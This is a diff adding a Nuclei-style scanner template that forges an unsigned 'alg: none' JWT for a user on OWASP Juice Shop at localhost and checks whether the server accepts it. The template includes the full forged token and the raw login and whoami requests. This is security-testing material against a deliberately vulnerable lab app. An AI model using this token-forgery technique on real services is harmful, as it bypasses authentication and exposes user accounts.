@@ -1,0 +1,77 @@
+id: unsigned_jwt_Vulnerable and outdated components
+
+info:
+  name: Unsigned JWT Automation
+  author: your_name
+  severity: info
+  description: Automating JWT token manipulation to test for unsigned JWT vulnerability.
+
+variables:
+  header: '{"typ":"JWT","alg":"none"}'
+  payload: >-
+    {
+      "status": "success",
+      "data": {
+        "id": 22,
+        "username": "",
+        "email": "jwtn3d@juice-sh.op",
+        "password": "f0be17b0fc1b698e86b704548693e674",
+        "role": "customer",
+        "deluxeToken": "",
+        "lastLoginIp": "10.0.2.100",
+        "profileImage": "/assets/public/images/uploads/default.svg",
+        "totpSecret": "",
+        "isActive": true,
+        "createdAt": "2025-03-17 16:35:21.286 +00:00",
+        "updatedAt": "2025-03-17 20:21:42.219 +00:00",
+        "deletedAt": null
+      },
+      "iat": 1742242914
+    }
+  final_payload: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqd3RuM2RAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImZmZTVhMTZkODQ4MDgwMDYyNDQxMDVmNmM4MTAwNzBkIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjEwLjAuMi4xMDAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNS0wMy0xOCAyMzoyODo1OS44OTUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNS0wMy0xOCAyMzozMDoyMC45MDYgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzQyMzQyMjExfQ.'
+
+requests:
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"email":"trycyber@gmail.com","password":"trycyber"}
+
+    extractors:
+      - type: regex
+        name: jwt_token
+        internal: true
+        group: 1
+        regex:
+          - '"token"\s*:\s*"([^"]+)"'
+
+  - raw:
+      - |
+        GET /rest/user/whoami HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Authorization: Bearer {{final_payload}}
+        Cookie: language=en; token={{final_payload}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "jwtn3d@juice-sh.op"
+        part: body  
+        
+    extractors:
+      - type: regex
+        name: "found_email"
+        regex:
+          - '"([a-zA-Z0-9._%+-]+@juice-sh\.op)"'
+        part: body
+
+
